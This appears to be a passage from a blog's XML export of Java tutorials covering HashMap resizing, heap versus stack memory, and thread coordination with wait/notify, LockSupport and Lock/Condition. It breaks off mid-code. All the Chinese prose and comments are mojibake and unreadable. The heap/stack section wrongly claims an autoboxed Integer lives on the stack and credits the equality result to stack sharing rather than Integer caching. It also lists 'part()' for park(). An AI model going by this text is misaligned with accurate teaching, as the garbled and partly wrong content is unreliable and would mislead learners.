<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The load factor used when none specified in constructor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> DEFAULT_LOAD_FACTOR = <span class="number">0.75f</span>;</span><br><span class="line"></span><br><span class="line">newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br></pre></td></tr></table></figure>
<p>æ‰©å®¹çš„æ­¥éª¤ï¼š<br>aï¼Œå…ˆè®¡ç®—ä¸€ä¸ªæ–°çš„æ•°ç»„çš„å¤§å°<br>bï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œnew<br>cï¼Œè¿›è¡Œä¸€ä¸ªæ•°æ®ç§»åŠ¨ï¼Œold -&gt; new</p>
<p>å†…å®¹ä¸»è¦æœ‰3ç§å…±å­˜çš„èŠ‚ç‚¹å½¢å¼ï¼Œé€ä¸ªè¿›è¡Œåˆ¤æ–­ï¼Œç„¶åè½¬ç§»ï¼Œå…·ä½“ä»£ç ä½“ç°å¦‚ä¸‹ï¼š<br>aï¼Œæ•°ç»„æœ‰å…ƒç´ ï¼Œnextæ— å…ƒç´ <br>bï¼Œæ•°ç»„æœ‰å…ƒç´ ï¼Œnextä¸ºé“¾è¡¨<br>cï¼Œæ•°ç»„æœ‰å…ƒç´ ï¼Œnextä¸ºçº¢é»‘æ ‘</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">table = newTab;</span><br><span class="line"><span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">        Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                Node&lt;K,V&gt; next;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    next = e.next;</span><br><span class="line">                    <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                            loHead = e;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            loTail.next = e;</span><br><span class="line">                        loTail = e;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                            hiHead = e;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            hiTail.next = e;</span><br><span class="line">                        hiTail = e;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                    newTab[j] = loHead;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                    newTab[j + oldCap] = hiHead;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newTab;</span><br></pre></td></tr></table></figure>
<p>ç®€å•çš„çœ‹ï¼Œä¹Ÿå°±è¿™ä¹ˆå¤šä¸œè¥¿ã€‚</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>hashmap</tag>
        <tag>åº•å±‚</tag>
        <tag>é“¾è¡¨</tag>
      </tags>
  </entry>
  <entry>
    <title>å †å’Œæ ˆçš„åŒºåˆ«</title>
    <url>/2020/06/27/read-head-stack/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>javaçš„å†…å­˜æœ‰ä¸¤ç§ï¼šå †å†…å­˜å’Œæ ˆå†…å­˜ï¼Œå †å’Œæ ˆéƒ½æ˜¯ç”¨æ¥åœ¨å†…å­˜ä¸­å­˜æ”¾æ•°æ®çš„åœ°æ–¹ï¼Œåªæ˜¯å„è‡ªçš„è¿è¡Œæœºåˆ¶æœ‰æ‰€ä¸åŒã€‚</p>
<h4 id="ä»€ä¹ˆæ˜¯å †"><a href="#ä»€ä¹ˆæ˜¯å †" class="headerlink" title="ä»€ä¹ˆæ˜¯å †"></a>ä»€ä¹ˆæ˜¯å †</h4><p>å †ï¼Œæ˜¯è¿è¡Œæ—¶æ•°æ®åŒºï¼Œé€šè¿‡newç­‰æŒ‡ä»¤å»ºç«‹çš„å¯¹è±¡ä»å †ä¸­åˆ†é…ç©ºé—´ï¼Œç„¶åé€šè¿‡GCåƒåœ¾å›æ”¶å™¨æ¥è¿›è¡Œé”€æ¯ã€‚</p>
<p>å †çš„å†…å­˜ç©ºé—´å¤§å°ï¼Œæ˜¯ç”±javaè‡ªå·±åœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ†é…çš„ï¼Œä¸éœ€è¦æˆ‘ä»¬æŒ‡å®šè®¾ç½®ã€‚ä¸è¿‡ï¼Œä¹Ÿå› æ­¤å¯¼è‡´å¯¹çš„å­˜å–é€Ÿåº¦ç›¸å¯¹æ¯”è¾ƒæ…¢ã€‚</p>
<p>ä¸‹é¢çš„æ¡ˆä¾‹ï¼Œå­˜æ”¾åœ¨å †ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer num = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br></pre></td></tr></table></figure>
<h4 id="ä»€ä¹ˆæ˜¯æ ˆ"><a href="#ä»€ä¹ˆæ˜¯æ ˆ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ ˆ"></a>ä»€ä¹ˆæ˜¯æ ˆ</h4><p>æ ˆï¼Œä¸»è¦å­˜æ”¾ä¸€äº›åŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡å’Œå¯¹è±¡çš„å¼•ç”¨ï¼Œæ ˆçš„æ•°æ®æ˜¯å¯ä»¥å…±äº«çš„ã€‚</p>
<p>åŸºæœ¬æ•°é‡ç±»å‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">byteï¼Œshortï¼Œintï¼Œlongï¼Œfloatï¼Œdoubleï¼Œbooleanï¼Œchar</span><br></pre></td></tr></table></figure>
<p>æ ˆçš„å†…å­˜ç©ºé—´å¤§å°ï¼Œåœ¨ç¨‹åºç¼–è¯‘æ—¶ï¼Œå°±æŒ‡å®šç¡®è®¤ä¸‹æ¥ã€‚æ‰€ä»¥æ ˆçš„å­˜å–é€Ÿåº¦æ¯”å †å¿«ï¼Œè€Œä¸”ä»…æ¬¡äºå¯„å­˜å™¨ã€‚</p>
<p>ä¸‹é¢çš„æ¡ˆä¾‹ï¼Œå­˜æ”¾åœ¨æ ˆä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer num = <span class="number">123</span>;</span><br></pre></td></tr></table></figure>
<h4 id="éªŒè¯ä»–ä»¬çš„åŒºåˆ«ï¼Ÿ"><a href="#éªŒè¯ä»–ä»¬çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="éªŒè¯ä»–ä»¬çš„åŒºåˆ«ï¼Ÿ"></a>éªŒè¯ä»–ä»¬çš„åŒºåˆ«ï¼Ÿ</h4><p>å †å’Œæ ˆï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†å¯¹å®ƒä»¬äº†è§£ï¼Œä¹Ÿè®¤è¯†äº†å®ƒä»¬çš„åŒºåˆ«ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å»è¿›è¡ŒéªŒè¯ï¼Ÿ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å †æ•°æ®ï¼Œæ¯ä¸ªnewå‡ºæ¥çš„å¯¹è±¡éƒ½ç‹¬ç«‹å ç”¨ä¸€å—å†…å­˜</span></span><br><span class="line">    Integer num_d_1 = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br><span class="line">    Integer num_d_2 = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ˆæ•°æ®ï¼Œå­˜æ”¾çš„æ˜¯å¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line">    Integer num_z_1 = <span class="number">123</span>;</span><br><span class="line">    Integer num_z_2 = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŸºæœ¬æ•°æ®ç±»å‹ï¼Œå­˜æ”¾åœ¨æ ˆä¸­</span></span><br><span class="line">    <span class="keyword">int</span> num_j_1 = <span class="keyword">new</span> Integer(<span class="number">123</span>);</span><br><span class="line">    <span class="keyword">int</span> num_j_2 = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;å †å¯¹è±¡æ¯”è¾ƒï¼š&quot;</span> + (num_d_1 == num_d_2));</span><br><span class="line">    System.out.println(<span class="string">&quot;æ ˆå¯¹è±¡æ¯”è¾ƒï¼š&quot;</span> + (num_z_1 == num_z_2));</span><br><span class="line">    System.out.println(<span class="string">&quot;åŸºæœ¬æ•°æ®ç±»å‹æ¯”è¾ƒï¼š&quot;</span> + (num_j_1 == num_j_2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å †å¯¹è±¡æ¯”è¾ƒï¼šfalse</span><br><span class="line">æ ˆå¯¹è±¡æ¯”è¾ƒï¼štrue</span><br><span class="line">åŸºæœ¬æ•°æ®ç±»å‹æ¯”è¾ƒï¼štrue</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„æ¡ˆä¾‹ï¼Œè¯ é‡Šäº†å®ƒä»¬çš„åŒºåˆ«ï¼š<br>å †ï¼Œæ¯ä¸ªnewå‡ºæ¥çš„å¯¹è±¡éƒ½ç‹¬ç«‹å ç”¨ä¸€å—å†…å­˜åœ°å€ï¼Œæ‰€ä»¥ä¸¤è€…ä¸ç›¸ç­‰ã€‚<br>æ ˆï¼Œå› ä¸ºä¸Šä¸€ä¸ªå€¼å­˜åœ¨ï¼Œè€Œç›´æ¥æŒ‡å‘äº†ç›¸åŒçš„å†…å­˜åœ°å€ï¼Œæ‰€ä»¥ä¸¤è€…ç›¸ç­‰ã€‚<br>åŸºæœ¬ç±»å‹ï¼Œå­˜æ”¾çš„å°±ç›´æ¥æ˜¯å€¼ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>å †</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¿ç¨‹é€šè®¯</title>
    <url>/2020/06/22/read-thread-sync/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>çº¿ç¨‹é€šè®¯çš„æœ¬è´¨ï¼Œå…¶å®å°±æ˜¯é€šçŸ¥å’Œæ§åˆ¶ï¼Œè€Œåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ï¼Œé€šè¿‡åå…«èˆ¬æ­¦è‰ºå»æ§åˆ¶å…¶ä»–çº¿ç¨‹çš„æ–¹æ³•ï¼Œå°±æ˜¯çº¿ç¨‹é€šè®¯å®ç°æ–¹å¼ã€‚</p>
<p>å…¶ç›®çš„æ˜¯ä¸ºäº†çº¿ç¨‹ä¹‹é—´æ›´å¥½çš„åä½œï¼Œä»è€Œå®Œæˆä¸€äº›å¤æ‚çš„å·¥ä½œã€‚</p>
<h4 id="çº¿ç¨‹é€šè®¯çš„å‡ ç§æ–¹å¼"><a href="#çº¿ç¨‹é€šè®¯çš„å‡ ç§æ–¹å¼" class="headerlink" title="çº¿ç¨‹é€šè®¯çš„å‡ ç§æ–¹å¼"></a>çº¿ç¨‹é€šè®¯çš„å‡ ç§æ–¹å¼</h4><p>æƒ³è¦å®ç°çº¿ç¨‹ä¹‹é—´çš„é€šè®¯ï¼Œæ–¹å¼æ–¹æ³•éå¸¸çš„å¤šï¼Œä¸‹é¢æˆ‘ä»¬ä¸¾ä¸€ä¸ªå¾ˆç®€å•çš„çº¿ç¨‹é¢˜ç›®ï¼Œé€šè¿‡å‡ ç§æ¯”è¾ƒå¸¸è§çš„æ–¹æ³•å»å®Œæˆè¿™é“é¢˜ç›®ï¼Œä»è€Œç†è§£çº¿ç¨‹ä¹‹é—´é€šè®¯çš„è¿‡ç¨‹å’Œæ–¹æ³•ã€‚</p>
<h5 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å‡è®¾æœ‰2ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªçº¿ç¨‹ä»…æ‰“å°æ•°å­—ï¼Œä¸€ä¸ªçº¿ç¨‹ä»…æ‰“å°å­—æ¯ã€‚è€Œéœ€æ±‚æ˜¯è¦å®ç°æ•°å­—å’Œå­—æ¯äº¤æ›¿æ‰“å°çš„æ•ˆæœï¼Œ</span><br><span class="line">å¹¶ä¸”ç¬¬ä¸€ä¸ªæ‰“å°çš„å¿…é¡»æ˜¯æ•°å­—ï¼Œå¦‚ï¼š1A2B3C.. åº”è¯¥å¦‚ä½•å»å®ç°å‘¢ï¼Ÿ</span><br></pre></td></tr></table></figure>
<h5 id="notify-waitæ–¹å¼"><a href="#notify-waitæ–¹å¼" class="headerlink" title="notify + waitæ–¹å¼"></a>notify + waitæ–¹å¼</h5><p>ä½¿ç”¨notifyå’Œwaitçš„æ—¶å€™å‘¢ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆä½¿ç”¨å…³é”®å­—synchronizedåŠ é”å¯¹è±¡ï¼Œå¦åˆ™æ˜¯æ— æ³•ä½¿ç”¨å¯¹è±¡çš„è¿™ä¸¤ä¸ªæ–¹æ³•çš„ã€‚</p>
<p>æ‰€ä»¥å‡†ç¡®çš„è¯´ï¼Œåº”è¯¥æ˜¯synchronized + notify/waitçš„å®ç°æ–¹å¼ã€‚</p>
<p>ä¸»è¦æ–¹æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notify(): éšæœºå”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹</span><br><span class="line"></span><br><span class="line">notifyAll(): å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span><br><span class="line"></span><br><span class="line">wait(): ä½¿å½“å‰çº¿ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€</span><br></pre></td></tr></table></figure>
<p>æ¼”ç¤ºæ¡ˆä¾‹å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NotifyWaitTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨äºsynchronizedé”ï¼Œä¸ºä»€ä¹ˆè¦é”å®šä¸€ä¸ªå…¬å…±å¯¹è±¡è€Œä¸ç›´æ¥ç”¨thisï¼Ÿå› ä¸ºåŒ¿åç±»çš„</span></span><br><span class="line">    <span class="comment">// åŸå› ï¼Œç”¨thiså…¶å®æ˜¯é”å®šçš„çº¿ç¨‹å„è‡ªçš„åŒ¿åç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object obj = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// æ•°å­—ä¼˜å…ˆè¾“å‡ºï¼Œæ‰€ä»¥å­—æ¯å…ˆè¿›å…¥ç­‰å¾…é˜Ÿåˆ— ç­‰å¾…å«é†’</span></span><br><span class="line">                    obj.wait();</span><br><span class="line">                    <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                        <span class="comment">// æ‰“å°å­—æ¯</span></span><br><span class="line">                        System.out.print(str);</span><br><span class="line">                        <span class="comment">// é€šçŸ¥å…¶ä»–çº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">                        obj.notify();</span><br><span class="line">                        <span class="comment">// å½“å‰çº¿ç¨‹è®©å‡ºé”ï¼Œè¿›å…¥ç­‰å¾…é˜Ÿåˆ—</span></span><br><span class="line">                        obj.wait();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ä¿è¯çº¿ç¨‹æ­£å¸¸å…³é—­</span></span><br><span class="line">                obj.notify();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj)&#123;</span><br><span class="line">                <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                    <span class="comment">// æ‰“å°æ•°å­—</span></span><br><span class="line">                    System.out.print(num);</span><br><span class="line">                    <span class="comment">// é€šçŸ¥å…¶ä»–çº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">                    obj.notify();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// å½“å‰çº¿ç¨‹è®©å‡ºé”ï¼Œè¿›å…¥ç­‰å¾…é˜Ÿåˆ—</span></span><br><span class="line">                        obj.wait();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ä¿è¯çº¿ç¨‹æ­£å¸¸å…³é—­</span></span><br><span class="line">                obj.notify();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="LockSupportæ–¹å¼"><a href="#LockSupportæ–¹å¼" class="headerlink" title="LockSupportæ–¹å¼"></a>LockSupportæ–¹å¼</h5><p>LockSupportæ˜¯ä¸€ä¸ªå·¥å…·ç±»ï¼Œå†…éƒ¨æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯é™æ€çš„ï¼Œè€Œå…¶åŠŸèƒ½ï¼Œä¸»è¦å°±æ˜¯å¯¹çº¿ç¨‹è¿›è¡Œé˜»å¡å’Œå”¤é†’ã€‚</p>
<p>åŒæ ·çš„ï¼Œæˆ‘ä»¬é€šè¿‡LockSupportæ§åˆ¶çº¿ç¨‹çš„é˜»å¡å’Œå”¤é†’ï¼Œä¹Ÿæ˜¯å¯ä»¥è½»æ˜“å®Œæˆä»¥ä¸Šæ¡ˆä¾‹è¦æ±‚çš„ã€‚</p>
<p>ä¸»è¦æ–¹æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void part(): é˜»å¡å½“å‰çº¿ç¨‹</span><br><span class="line"></span><br><span class="line">void parkUntil(long deadline): é˜»å¡å½“å‰çº¿ç¨‹ï¼Œå¹¶æŒ‡å®šæˆªæ­¢æ—¶é—´(å•ä½:13ä½çš„æ—¶é—´æˆ³)</span><br><span class="line"></span><br><span class="line">void parkNanos(long nanos): é˜»å¡å½“å‰çº¿ç¨‹ï¼Œå¹¶è®¾ç½®è¶…æ—¶æ—¶é—´(å•ä½:çº³ç§’ï¼Œ1ç§’&#x3D;1000000000Lçº³ç§’)</span><br><span class="line"></span><br><span class="line">unpark(Thread thread): å”¤é†’æŒ‡å®šçº¿ç¨‹</span><br></pre></td></tr></table></figure>
<p>æ¼”ç¤ºæ¡ˆä¾‹å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockSupportTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰2ä¸ªçº¿ç¨‹ï¼Œç”¨äºåˆ†åˆ«æ‰“å°å­—æ¯å’Œæ•°å­—</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Thread thread4letter = <span class="keyword">null</span>, thread4number = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        thread4letter = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// ä¼˜å…ˆè¾“å‡ºæ•°å­—ï¼Œå­—æ¯çº¿ç¨‹é˜»å¡</span></span><br><span class="line">            LockSupport.park();</span><br><span class="line">            <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                <span class="comment">// æ‰“å°å­—æ¯</span></span><br><span class="line">                System.out.print(str);</span><br><span class="line">                <span class="comment">// å”¤é†’æ•°å­—çº¿ç¨‹</span></span><br><span class="line">                LockSupport.unpark(thread4number);</span><br><span class="line">                <span class="comment">// é˜»å¡å½“å‰çº¿ç¨‹ï¼Œå¯ä»¥è¢«unparkå”¤é†’</span></span><br><span class="line">                LockSupport.park();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ä¿è¯çº¿ç¨‹æ­£å¸¸å…³é—­</span></span><br><span class="line">            LockSupport.unpark(thread4number);</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">        thread4number = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                <span class="comment">// æ‰“å°æ•°å­—</span></span><br><span class="line">                System.out.print(num);</span><br><span class="line">                <span class="comment">// å”¤é†’å­—æ¯çº¿ç¨‹</span></span><br><span class="line">                LockSupport.unpark(thread4letter);</span><br><span class="line">                <span class="comment">// é˜»å¡å½“å‰çº¿ç¨‹ï¼Œå¯ä»¥è¢«unparkå”¤é†’</span></span><br><span class="line">                LockSupport.park();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ä¿è¯çº¿ç¨‹æ­£å¸¸å…³é—­</span></span><br><span class="line">            LockSupport.unpark(thread4letter);</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯åŠ¨2ä¸ªçº¿ç¨‹</span></span><br><span class="line">        thread4letter.start();</span><br><span class="line">        thread4number.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Lock-Conditionæ–¹å¼"><a href="#Lock-Conditionæ–¹å¼" class="headerlink" title="Lock + Conditionæ–¹å¼"></a>Lock + Conditionæ–¹å¼</h5><p>Lock + Conditionæ¥å®ç°è¿™ä¸ªæ¡ˆä¾‹ï¼Œç›¸å¯¹æ¥è¯´æ˜¯æ¯”è¾ƒä¼˜é›…çš„ï¼Œå› ä¸ºå®ƒå¯ä»¥ç»™é”æŒ‡å®šå¤šä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬é€šè¿‡æ“æ§æ¡ä»¶ï¼Œå°±å¯ä»¥è½»æ˜“çš„åœ¨ä¸åŒåœºæ™¯ä¸‹å®Œæˆå¯¹é”çš„æ§åˆ¶ï¼Œä»è€Œå®Œæˆå¯¹çº¿ç¨‹çš„æ§åˆ¶ã€‚</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockConditionTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªå¯é‡å…¥é”</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰é”çš„å­—æ¯çº¿ç¨‹æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Condition letterCondition = lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰é”çš„æ•°å­—çº¿ç¨‹æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Condition numberCondition = lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// ä¼˜å…ˆè¾“å‡ºæ•°å­—ï¼Œå­—æ¯çº¿ç¨‹ç­‰å¾…</span></span><br><span class="line">                letterCondition.await();</span><br><span class="line">                <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                    <span class="comment">// æ‰“å°å­—æ¯</span></span><br><span class="line">                    System.out.print(str);</span><br><span class="line">                    <span class="comment">// é€šçŸ¥æ•°å­—çº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">                    numberCondition.signal();</span><br><span class="line">                    <span class="comment">// æœ¬çº¿ç¨‹ç­‰å¾…</span></span><br><span class="line">                    letterCondition.await();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ä¿è¯çº¿ç¨‹æ­£å¸¸å…³é—­</span></span><br><span class="line">                numberCondition.signal();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) 